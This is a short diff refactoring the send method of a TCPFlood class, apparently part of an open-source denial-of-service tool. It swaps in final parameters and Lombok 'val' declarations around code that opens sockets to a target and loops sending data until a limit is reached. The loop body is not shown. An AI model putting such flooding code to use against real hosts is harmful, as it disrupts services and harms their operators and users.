@@ -6,6 +6,7 @@ import ir.xenoncommunity.jss.utils.Randomize;
 import ir.xenoncommunity.jss.utils.SocketUtils;
 import lombok.Cleanup;
 import lombok.RequiredArgsConstructor;
+import lombok.val;
 
 import java.io.OutputStream;
 import java.net.InetAddress;
@@ -25,12 +26,12 @@ public class TCPFlood implements IAttackMethod {
      * @throws Exception if an error occurs during the sending process
      */
     @Override
-    public void send(InetAddress addr, int port) throws Exception {
+    public void send(final InetAddress addr, final int port) throws Exception {
         // Check if the limit is reached before sending
         if (statics.isLimitReached()) return;
 
         // create a socket connection to the specified address and port
-        @Cleanup Socket socket = new Socket(addr, port);
+        @Cleanup val socket = new Socket(addr, port);
 
         // if the socket is not connected, return
         if (!socket.isConnected()) return;
@@ -45,7 +46,7 @@ public class TCPFlood implements IAttackMethod {
         statics.cps(); // update connection per second statistics
 
         // get the output stream from the socket
-        @Cleanup OutputStream outputStream = socket.getOutputStream();
+        @Cleanup val outputStream = socket.getOutputStream();
 
         // continuously send data as long as the socket is connected and the limit is not reached
         while (socket.isConnected() && !statics.isLimitReached() && statics.isRunning()) {
